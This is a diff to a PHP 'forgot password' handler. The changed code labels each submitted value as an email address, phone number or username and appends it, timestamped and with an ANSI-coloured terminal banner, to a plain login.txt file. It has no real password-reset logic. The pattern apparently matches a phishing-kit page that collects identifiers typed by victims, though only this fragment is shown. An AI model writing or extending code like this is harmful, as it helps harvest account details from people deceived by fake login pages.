@@ -1,14 +1,22 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // Forgot Password Handler
-    if (isset($_POST['forgot_user'])) {
-    $user = $_POST['forgot_user'] ?? 'UNKNOWN';
+    if (isset($_POST['forgot_user']) && !isset($_POST['username']) && !isset($_POST['email'])) {
+        $input = trim($_POST['forgot_user']);
+        $label = "UNKNOWN";
 
-        // Colored log for terminal
-        $header = "\033[36m==== [FORGOT PASSWORD ATTEMPT] ====\033[0m\n";
-        $log = "Input: $user\n";
+        if (filter_var($input, FILTER_VALIDATE_EMAIL)) {
+            $label = "Email";
+        } elseif (preg_match("/^[0-9]{7,15}$/", $input)) {
+            $label = "Phone";
+        } elseif (preg_match("/^[a-zA-Z0-9._]+$/", $input)) {
+            $label = "Username";
+        }
+
+        $header = "\033[36m==== [FORGOT PASSWORD] ====\033[0m\n";
+        $log = "$label: $input\n";
         $log .= "Time: " . date("Y-m-d H:i:s") . "\n";
-        $log .= "====================================\n\n";
+        $log .= "=============================\n\n";
 
         file_put_contents("login.txt", strip_tags($header . $log), FILE_APPEND);
 
